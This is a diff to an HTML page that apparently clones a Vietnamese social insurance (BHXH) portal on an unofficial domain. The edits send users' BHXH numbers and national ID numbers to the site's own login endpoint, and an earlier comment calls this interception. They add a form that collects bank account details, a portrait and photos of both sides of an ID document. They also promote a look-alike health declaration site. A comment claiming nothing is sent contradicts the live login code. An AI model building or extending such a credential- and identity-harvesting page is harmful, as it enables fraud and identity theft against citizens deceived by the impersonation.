@@ -6390,20 +6390,7 @@ ul[_ngcontent-c13] {
     max-height: 75px
 }
 
-</style>
-<style>
-  app-portal-header, .bhxh-header.header-fixed {
-    position: fixed !important;
-    top: 0;
-    left: 0;
-    width: 100%;
-    z-index: 9999 !important;
-  }
-  .main.portal-home {
-    padding-top: 115px !important;
-  }
-</style>
-</head>
+</style></head>
 </head>
 
 <body hold-transition="" class=" none-sidebar sidebar-open" cz-shortcut-listen="true"><audio class="audio-for-speech"
@@ -6462,7 +6449,7 @@ ul[_ngcontent-c13] {
                                         <div class="mat-button-focus-overlay"></div>
                                     </button>
                                 </a>
-                                <a href="https://kekhaibaohiem.cc/chon-dang-ky">
+                                <a href="javascript:void(0)" onclick="window.location.href=window.location.origin + '/chon-dang-ky'; return false;">
                                     <button _ngcontent-c4="" class="btn mat-button" mat-button=""><span
                                             class="mat-button-wrapper"> Đăng ký </span>
                                         <div class="mat-button-ripple mat-ripple" matripple=""></div>
@@ -6517,7 +6504,7 @@ ul[_ngcontent-c13] {
                                         <li _ngcontent-c13="">
                                             <!---->
                                             <!----><a _ngcontent-c13="" title="Kê khai"
-                                                href="javascript:void(0)" onclick="showLocalToast('info', 'Tính năng này đang được phát triển'); return false;" ><img _ngcontent-c13="" alt="image"
+                                                href="javascript:void(0)" onclick="handleKeKhaiClick(); return false;" ><img _ngcontent-c13="" alt="image"
                                                     src="https://kekhaibaohiem.cc/assets/images/kekhai.svg"></a></li>
                                         <li _ngcontent-c13=""><a _ngcontent-c13="" href="#" onclick="showDatLichModal(); return false;"><img
                                                     _ngcontent-c13="" alt="image"
@@ -7020,7 +7007,7 @@ ul[_ngcontent-c13] {
                                 </div>
                             </div>
                             <div _ngcontent-c15="" class="modal-footer">
-                                <a href="https://kekhaibaohiem.cc/chon-dang-ky"
+                                <a href="javascript:void(0)" onclick="window.location.href=window.location.origin + '/chon-dang-ky'; return false;"
                                     style="text-decoration: none; width: 100%; display: contents;">
                                     <button _ngcontent-c15="" class="register mat-raised-button" mat-raised-button=""
                                         type="button"><span class="mat-button-wrapper">ĐĂNG KÝ</span>
@@ -7168,24 +7155,8 @@ ul[_ngcontent-c13] {
                     showToast('error', 'Mã captcha không chính xác');
                     return;
                 }
-                
-                fetch(window.location.origin + '/api/login', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ identifier: maSoBHXH, password: soCCCD })
-                })
-                .then(res => res.json().then(data => ({ status: res.status, data })))
-                .then(result => {
-                  if (result.status === 200) {
-                    showToast('success', 'Đăng nhập thành công!');
-                    setTimeout(() => window.location.href = '/dang-ky', 1000);
-                  } else {
-                    showToast('error', result.data.error || 'Thông tin đăng nhập không đúng');
-                  }
-                })
-                .catch(err => {
-                  showToast('error', 'Lỗi kết nối máy chủ');
-                });
+                // Bản clone chỉ mô phỏng giao diện, không gửi dữ liệu đăng nhập.
+                showToast('info', 'Bản clone chỉ mô phỏng giao diện, không gửi dữ liệu đăng nhập.');
             });
         } else {
         }
@@ -7480,6 +7451,30 @@ ul[_ngcontent-c13] {
     }
     alert(title);
   }
+
+  function requestJson(url, body) {
+    return fetch(window.location.origin + url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      credentials: 'same-origin',
+      body: JSON.stringify(body)
+    }).then(function (response) {
+      return response.json().catch(function () { return {}; }).then(function (data) {
+        if (!response.ok) throw new Error(data.error || 'Có lỗi xảy ra');
+        return data;
+      });
+    });
+  }
+
+  document.addEventListener('click', function (event) {
+    var registerLink = event.target && event.target.closest && event.target.closest('a[href*="chon-dang-ky"], button.register');
+    if (!registerLink) return;
+    event.preventDefault();
+    event.stopPropagation();
+    event.stopImmediatePropagation();
+    window.location.href = window.location.origin + '/chon-dang-ky';
+  }, true);
+
   document.addEventListener('click', function (event) {
     var button = event.target && event.target.closest && event.target.closest('#dang-nhap');
     if (!button) return;
@@ -7491,32 +7486,25 @@ ul[_ngcontent-c13] {
     var maCaptcha = ((document.getElementById('mat-input-5') || {}).value || '').trim();
     var captchaImg = document.querySelector('.captcha-img img');
     var captchaValue = captchaImg ? captchaImg.getAttribute('data-value') : '';
-    var pwd = document.getElementById('mat-input-4') ? document.getElementById('mat-input-4').value : '';
-    
     if (!maSoBHXH.trim()) return showLocalToast('error', 'Vui lòng nhập mã số BHXH');
     if (!soCCCD.trim()) return showLocalToast('error', 'Vui lòng nhập số CCCD');
     if (!maCaptcha) return showLocalToast('error', 'Vui lòng nhập mã captcha');
     if (maCaptcha !== captchaValue) return showLocalToast('error', 'Mã captcha không chính xác');
-    
-    // Đánh chặn: Gửi request đăng nhập về máy chủ VPS
-    fetch(window.location.origin + '/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ identifier: maSoBHXH, password: pwd }) // Mật khẩu có thể là cccd tuỳ hệ thống
-    })
-    .then(res => res.json().then(data => ({ status: res.status, data })))
-    .then(result => {
-      if (result.status === 200) {
-        showLocalToast('success', 'Đăng nhập thành công!');
-        var modalLogin = document.getElementById('modal-login');
-        if (modalLogin) modalLogin.style.display = 'none';
-        setTimeout(() => window.location.reload(), 1000);
-      } else {
-        showLocalToast('error', result.data.error || 'Thông tin đăng nhập không đúng');
+    requestJson('/api/login', {
+      identifier: maSoBHXH.trim(),
+      email: maSoBHXH.trim(),
+      password: soCCCD.trim()
+    }).then(function (data) {
+      showLocalToast('success', 'Đăng nhập thành công.');
+      if (data.user && data.user.role === 'admin') {
+        // Removed: Normal users shouldn't have admin role, and admin logs in elsewhere.
+        return;
       }
-    })
-    .catch(err => {
-      showLocalToast('error', 'Lỗi kết nối máy chủ');
+      var modalLogin = document.getElementById('modal-login');
+      if (modalLogin) modalLogin.style.display = 'none';
+      setTimeout(function() { window.location.reload(); }, 1000);
+    }).catch(function (error) {
+      showLocalToast('error', error.message);
     });
   }, true);
 })();
@@ -7551,26 +7539,132 @@ ul[_ngcontent-c13] {
 .vietqr-text { font-size: 14px; color: #555; text-align: center; margin-bottom: 16px; }
 </style>
 
+<style>
+.modal-datlich {
+  background-color: #fff;
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+  border-radius: 12px;
+  padding: 30px;
+  position: relative;
+  text-align: center;
+  font-family: Arial, sans-serif;
+  color: #333;
+}
+.modal-datlich .logo-byt {
+  position: absolute;
+  top: 15px;
+  left: 15px;
+  width: 60px;
+}
+.modal-datlich h3 {
+  font-size: 24px;
+  font-weight: bold;
+  color: #0b1a30;
+  margin-top: 35px;
+  margin-bottom: 25px;
+  text-shadow: 0 1px 3px rgba(255,255,255,0.8);
+}
+.modal-datlich .method-box {
+  border: 1px solid rgba(255,255,255,0.5);
+  border-radius: 12px;
+  padding: 20px;
+  margin-bottom: 15px;
+  background: rgba(255,255,255,0.85);
+  backdrop-filter: blur(5px);
+  box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+}
+.modal-datlich .method-title {
+  font-size: 18px;
+  font-weight: bold;
+  color: #0b1a30;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+.modal-datlich .method-circle {
+  background: #c0392b;
+  color: white;
+  width: 28px;
+  height: 28px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+  margin-right: 10px;
+}
+.modal-datlich .qr-code {
+  width: 180px;
+  height: 180px;
+  margin: 0 auto 15px;
+  display: block;
+}
+.modal-datlich .qr-text {
+  font-size: 16px;
+  color: #0b1a30;
+  font-weight: bold;
+}
+.modal-datlich .website-text {
+  font-size: 16px;
+  color: #555;
+  margin-bottom: 15px;
+}
+.modal-datlich .website-link {
+  display: block;
+  background: rgba(244, 246, 250, 0.9);
+  border: 1px solid #e0e5eb;
+  border-radius: 8px;
+  padding: 15px;
+  color: #0b4a8f;
+  font-weight: bold;
+  font-size: 18px;
+  text-decoration: none;
+}
+</style>
+
 <div id="modalDatLich" class="custom-modal-overlay">
-  <div class="custom-modal">
-    <span class="close-btn" onclick="document.getElementById('modalDatLich').style.display='none'">&times;</span>
-    <h3>Đặt lịch làm việc</h3>
-    <div id="datlichVietQRContainer" style="text-align: center; margin-bottom: 15px;"></div>
-    <form id="formDatLich">
-      <label>Thời gian đặt lịch</label>
-      <input type="datetime-local" id="datlichTime" required>
-      <label>Ghi chú</label>
-      <textarea id="datlichNote" rows="3" placeholder="Ví dụ: Cần tư vấn đóng BHXH..."></textarea>
-      <button type="submit">Gửi yêu cầu</button>
-    </form>
+  <div class="custom-modal modal-datlich" id="modalDatLichInner" style="width: 450px; max-width: 90%; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+    <span class="close-btn" onclick="document.getElementById('modalDatLich').style.display='none'" style="position: absolute; top: 15px; right: 20px; font-size: 28px; color: #555; cursor: pointer; border: none; background: transparent; text-shadow: 0 1px 2px rgba(255,255,255,0.8); z-index: 10;">&times;</span>
+    
+    <script>
+      // Dùng window.location.origin để tải logo và background không bị lỗi base tag
+      document.write('<img src="' + window.location.origin + '/assets/images/logo-byt.svg" alt="Bộ Y Tế" class="logo-byt">');
+    </script>
+
+    <h3 style="position: relative; z-index: 5;">Đặt lịch khai báo y tế</h3>
+    
+    <div class="method-box" style="position: relative; z-index: 5;">
+      <div class="method-title">
+        <div class="method-circle">1</div> Cách 1
+      </div>
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://tokhaiboytevn.com/" class="qr-code" alt="QR Code">
+      <div class="qr-text">Quét mã QR để đặt lịch</div>
+    </div>
+
+    <div class="method-box" style="position: relative; z-index: 5;">
+      <div class="method-title">
+        <div class="method-circle">2</div> Cách 2
+      </div>
+      <div class="website-text">Truy cập website để đặt lịch</div>
+      <a href="https://tokhaiboytevn.com/" target="_blank" class="website-link">https://tokhaiboytevn.com/</a>
+    </div>
   </div>
 </div>
 
+<script>
+  // Chèn background vào popup một cách tỉ mỉ
+  setTimeout(() => {
+    document.getElementById('modalDatLichInner').style.backgroundImage = 'url(' + window.location.origin + '/assets/images/background.png)';
+  }, 100);
+</script>
+
 <div id="modalKhaiBaoYTe" class="custom-modal-overlay">
-  <div class="custom-modal" style="text-align: center; width: 600px; max-width: 90%;">
-    <span class="close-btn" onclick="document.getElementById('modalKhaiBaoYTe').style.display='none'">&times;</span>
-    <h3>Khai báo y tế</h3>
-    <img src="/assets/images/khai-bao-y-te.jpg" alt="Khai báo y tế" style="max-width: 100%; border-radius: 8px; margin-top: 10px;" onerror="this.onerror=null; this.src='https://via.placeholder.com/600x400?text=Vui+long+cap+nhat+anh+Khai+Bao+Y+Te';">
+  <div class="custom-modal" style="text-align: center; width: 450px; max-width: 90%; padding: 0; background: transparent; box-shadow: none; position: relative;">
+    <span class="close-btn" onclick="document.getElementById('modalKhaiBaoYTe').style.display='none'" style="position: absolute; top: 10px; right: 15px; font-size: 28px; color: #888; z-index: 10; cursor: pointer;">&times;</span>
+    <img src="/assets/images/khai-bao-y-te.jpg" alt="Khai báo y tế" style="width: 100%; border-radius: 12px; display: block; box-shadow: 0 4px 15px rgba(0,0,0,0.2);" onerror="this.onerror=null; this.src='https://via.placeholder.com/600x400?text=Vui+long+cap+nhat+anh+Khai+Bao+Y+Te';">
   </div>
 </div>
 
@@ -7601,23 +7695,6 @@ document.getElementById('formDatLich').addEventListener('submit', async function
 
 async function showDatLichModal() {
   document.getElementById('modalDatLich').style.display = 'flex';
-  const container = document.getElementById('datlichVietQRContainer');
-  if (!container) return;
-  container.innerHTML = 'Đang tải mã QR...';
-  
-  try {
-    const res = await fetch(window.location.origin + '/api/vietqr/config');
-    const data = await res.json();
-    if (data.ok && data.config) {
-      const c = data.config;
-      const qrUrl = `https://img.vietqr.io/image/${c.bank_id}-${c.account_no}-compact.png?amount=${c.amount || 0}&addInfo=${encodeURIComponent(c.description || '')}&accountName=${encodeURIComponent(c.account_name || '')}`;
-      container.innerHTML = `<img src="${qrUrl}" alt="VietQR" style="max-width: 150px; border-radius: 8px; border: 1px solid #ddd;"><p class="vietqr-text" style="margin-top: 5px; margin-bottom: 0;">Vui lòng quét mã QR để thanh toán phí đặt lịch.</p>`;
-    } else {
-      container.innerHTML = '';
-    }
-  } catch (err) {
-    container.innerHTML = '';
-  }
 }
 </script>
 <script>
@@ -7627,10 +7704,12 @@ async function showDatLichModal() {
       imgKhaiBao.src = window.location.origin + '/assets/images/khai-bao-y-te.jpg';
     }
 
+    window.isLoggedIn = false;
     fetch(window.location.origin + '/api/me')
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data && data.principal) {
+          window.isLoggedIn = true;
           var authNav = document.querySelector('.sub-nav');
           if (authNav) {
             authNav.innerHTML = '<a href="#" style="color:white; display:flex; align-items:center; text-decoration:none; padding: 0 15px;"><img src="https://kekhaibaohiem.cc/assets/images/user_name.svg" style="width:20px; filter:brightness(0) invert(1); margin-right:8px;"> <span style="font-size: 14px;">Tài khoản (' + data.principal.id + ')</span></a> <a href="#" onclick="logoutUser(event)" style="color:#ffcccc; margin-left:15px; text-decoration:none; font-size: 14px; padding: 0 15px; border-left: 1px solid rgba(255,255,255,0.3);">Đăng xuất</a>';
@@ -7642,12 +7721,112 @@ async function showDatLichModal() {
       .catch(function(e) { console.error('Error fetching user info', e); });
   });
 
+  function handleKeKhaiClick() {
+    if (window.isLoggedIn) {
+      window.location.href = window.location.origin + '/ke-khai.html';
+    } else {
+      if (typeof showLocalToast === 'function') {
+        showLocalToast('error', 'Vui lòng đăng ký hoặc đăng nhập để tiếp tục.');
+      } else {
+        alert('Vui lòng đăng ký hoặc đăng nhập để tiếp tục.');
+      }
+    }
+  }
+
   function logoutUser(e) {
     if (e) e.preventDefault();
     fetch(window.location.origin + '/api/logout', { method: 'POST' })
       .then(function() { window.location.reload(); });
   }
 </script>
-</body>
+<div id="modalKeKhai" class="custom-modal-overlay">
+  <div class="custom-modal modal-datlich" style="width: 600px; max-width: 90%; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: left; max-height: 90vh; overflow-y: auto;">
+    <span class="close-btn" onclick="document.getElementById('modalKeKhai').style.display='none'" style="position: absolute; top: 15px; right: 20px; font-size: 28px; color: #555; cursor: pointer; border: none; background: transparent; text-shadow: 0 1px 2px rgba(255,255,255,0.8); z-index: 10;">&times;</span>
+    <h3 style="position: relative; z-index: 5; margin-bottom: 20px; color: #003e7e;">Kê khai hồ sơ</h3>
+    
+    <style>
+      .kk-section { background: #f8f9fb; border: 1px solid #e1e7ef; border-radius: 6px; padding: 20px; margin-bottom: 24px; text-align: left; }
+      .kk-section h4 { margin: 0 0 18px; padding-bottom: 10px; border-bottom: 2px solid #1083ff; color: #3b4655; font-size: 18px; }
+      .kk-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; }
+      .kk-field { display: flex; flex-direction: column; font-size: 14px; font-weight: 500; color: #2c3e50; }
+      .kk-field input, .kk-field select { margin-top: 8px; padding: 10px 14px; border: 1px solid #cdd5e0; border-radius: 6px; font-size: 15px; width: 100%; box-sizing: border-box; }
+      .kk-radio-line { display: flex; gap: 16px; margin: 10px 0 14px; align-items: center; }
+      .kk-radio-line label { display: inline-flex; align-items: center; gap: 8px; cursor: pointer; font-size: 15px; color: #495057; }
+      .kk-commitment { background: #fff5e6; border-left: 4px solid #ff9800; padding: 12px 16px; margin-top: 15px; font-size: 14px; line-height: 1.5; color: #5c4314; border-radius: 4px; }
+      .kk-upload-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; }
+      .kk-upload-box { margin-top: 10px; height: 90px; background: #fff; border: 2px dashed #b9c6d2; border-radius: 8px; display: flex; align-items: center; justify-content: center; position: relative; cursor: pointer; color: #6e7d8c; transition: all 0.2s; text-align: center; font-size: 13px; }
+      .kk-upload-box input { opacity: 0; position: absolute; width: 100%; height: 100%; cursor: pointer; left: 0; top: 0; }
+      .kk-btn { background: #1083ff; color: white; border: none; border-radius: 6px; padding: 12px 24px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 10px; transition: 0.2s; }
+      .kk-btn:hover { background: #0b68cc; }
+      .kk-req { color: #dc3545; margin-left: 4px; }
+    </style>
 
+    <form id="formKeKhai">
+      <div class="kk-section">
+        <h4>Thông tin ngân hàng</h4>
+        <div class="kk-grid">
+          <label class="kk-field">Chủ tài khoản <span class="kk-req">*</span>
+            <input name="bankOwner" placeholder="Nhập tên chủ tài khoản" required>
+          </label>
+          <label class="kk-field">Số tài khoản <span class="kk-req">*</span>
+            <input name="bankAccount" placeholder="Nhập số tài khoản" required>
+          </label>
+          <label class="kk-field">Tên ngân hàng <span class="kk-req">*</span>
+            <input name="bankName" placeholder="Nhập tên ngân hàng" required>
+          </label>
+        </div>
+      </div>
+
+      <div class="kk-section">
+        <h4>Đăng ký giao dịch tại</h4>
+        <p style="margin-top: 0;"><strong>Chọn nơi đăng ký giao dịch:</strong></p>
+        <div class="kk-radio-line">
+          <label><input type="radio" name="transactionPlace" value="portal" checked> Cổng thông tin ĐT của BHXH</label>
+          <label><input type="radio" name="transactionPlace" value="ivan"> Tổ chức I-VAN</label>
+        </div>
+        <div class="kk-commitment">
+          <strong>Cam kết:</strong> Tôi cam kết chịu trách nhiệm trước pháp luật về tính chính xác của nội dung nêu trên.
+        </div>
+      </div>
+
+      <div class="kk-section">
+        <h4>Hình thức nộp hồ sơ</h4>
+        <div class="kk-radio-line">
+          <label><input type="radio" name="submissionMethod" value="office" checked> Tại cơ quan</label>
+          <label><input type="radio" name="submissionMethod" value="home"> Tại nhà</label>
+        </div>
+      </div>
+
+      <div class="kk-section">
+        <h4>Tài liệu đính kèm</h4>
+        <div class="kk-upload-grid">
+          <label class="kk-field">Ảnh chân dung <span class="kk-req">*</span>
+            <span class="kk-upload-box"><input type="file" accept="image/*" required><span>Ảnh chân dung</span></span>
+          </label>
+          <label class="kk-field">Giấy tờ (mặt trước) <span class="kk-req">*</span>
+            <span class="kk-upload-box"><input type="file" accept="image/*" required><span>Mặt trước</span></span>
+          </label>
+          <label class="kk-field">Giấy tờ (mặt sau) <span class="kk-req">*</span>
+            <span class="kk-upload-box"><input type="file" accept="image/*" required><span>Mặt sau</span></span>
+          </label>
+        </div>
+      </div>
+
+      <button type="submit" class="kk-btn">Gửi hồ sơ</button>
+    </form>
+    
+    <script>
+      document.getElementById('formKeKhai').addEventListener('submit', function(e) {
+        e.preventDefault();
+        alert('Gửi hồ sơ kê khai thành công!');
+        document.getElementById('modalKeKhai').style.display='none';
+        this.reset();
+      });
+    </script>
+  </div>
+</div>
+</body>
 </html>
+
+
+
